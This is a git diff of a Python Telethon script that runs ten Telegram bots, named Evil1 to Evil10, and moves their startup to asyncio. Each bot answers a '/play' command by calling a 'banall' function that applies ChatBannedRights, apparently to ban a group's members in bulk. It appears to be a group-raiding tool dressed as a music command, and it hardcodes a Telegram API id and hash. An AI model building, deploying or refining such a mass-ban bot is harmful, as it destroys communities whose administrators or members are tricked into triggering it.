@@ -1,4 +1,5 @@
 import logging
+import asyncio
 from decouple import config
 from os import getenv
 from telethon import TelegramClient, events
@@ -9,6 +10,7 @@ from telethon.tl.types import (
     ChatBannedRights,
 )
 
+# Configuration
 BOT_TOKEN1 = config("BOT_TOKEN1", None)
 BOT_TOKEN2 = config("BOT_TOKEN2", None)
 BOT_TOKEN3 = config("BOT_TOKEN3", None)
@@ -37,17 +39,18 @@ RIGHTS = ChatBannedRights(
 )
 
 logging.basicConfig(level=logging.INFO)
-Evil1 = TelegramClient('EVIL1', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN1)
-Evil2 = TelegramClient('EVIL2', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN2)
-Evil3 = TelegramClient('EVIL3', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN3)
-Evil4 = TelegramClient('EVIL4', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN4)
-Evil5 = TelegramClient('EVIL5', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN5)
-Evil6 = TelegramClient('EVIL6', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN6)
-Evil7 = TelegramClient('EVIL7', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN7)
-Evil8 = TelegramClient('EVIL8', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN8)
-Evil9 = TelegramClient('EVIL9', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN9)
-Evil10 = TelegramClient('EVIL10', 20310034, "e0d2c11f4ba291ce596868e73df87519").start(bot_token=BOT_TOKEN10)
 
+# Clients initialization
+Evil1 = TelegramClient('EVIL1', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil2 = TelegramClient('EVIL2', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil3 = TelegramClient('EVIL3', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil4 = TelegramClient('EVIL4', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil5 = TelegramClient('EVIL5', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil6 = TelegramClient('EVIL6', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil7 = TelegramClient('EVIL7', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil8 = TelegramClient('EVIL8', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil9 = TelegramClient('EVIL9', 20310034, "e0d2c11f4ba291ce596868e73df87519")
+Evil10 = TelegramClient('EVIL10', 20310034, "e0d2c11f4ba291ce596868e73df87519")
 
 @Evil1.on(events.NewMessage(pattern="^/play"))
 @Evil2.on(events.NewMessage(pattern="^/play"))
@@ -77,16 +80,36 @@ async def banall(event):
             except Exception as e:
                 pass
 
+async def main():
+    # Saare bots ko start karna
+    await asyncio.gather(
+        Evil1.start(bot_token=BOT_TOKEN1),
+        Evil2.start(bot_token=BOT_TOKEN2),
+        Evil3.start(bot_token=BOT_TOKEN3),
+        Evil4.start(bot_token=BOT_TOKEN4),
+        Evil5.start(bot_token=BOT_TOKEN5),
+        Evil6.start(bot_token=BOT_TOKEN6),
+        Evil7.start(bot_token=BOT_TOKEN7),
+        Evil8.start(bot_token=BOT_TOKEN8),
+        Evil9.start(bot_token=BOT_TOKEN9),
+        Evil10.start(bot_token=BOT_TOKEN10)
+    )
+    
+    print("💞 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳 𝑫𝑬𝑷𝑳𝑶𝒀 𝑩𝒀 𝑺𝑻𝑹𝑨𝑵𝑮𝑬𝑹")
+    
+    # Saare bots ko disconnect hone tak chalate rehna
+    await asyncio.gather(
+        Evil1.run_until_disconnected(),
+        Evil2.run_until_disconnected(),
+        Evil3.run_until_disconnected(),
+        Evil4.run_until_disconnected(),
+        Evil5.run_until_disconnected(),
+        Evil6.run_until_disconnected(),
+        Evil7.run_until_disconnected(),
+        Evil8.run_until_disconnected(),
+        Evil9.run_until_disconnected(),
+        Evil10.run_until_disconnected()
+    )
 
-print("💞 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳 𝑫𝑬𝑷𝑳𝑶𝒀 𝑩𝒀 𝑺𝑻𝑹𝑨𝑵𝑮𝑬𝑹")
-
-Evil1.run_until_disconnected()
-Evil2.run_until_disconnected()
-Evil3.run_until_disconnected()
-Evil4.run_until_disconnected()
-Evil5.run_until_disconnected()
-Evil6.run_until_disconnected()
-Evil7.run_until_disconnected()
-Evil8.run_until_disconnected()
-Evil9.run_until_disconnected()
-Evil10.run_until_disconnected()
+if __name__ == '__main__':
+    asyncio.run(main())
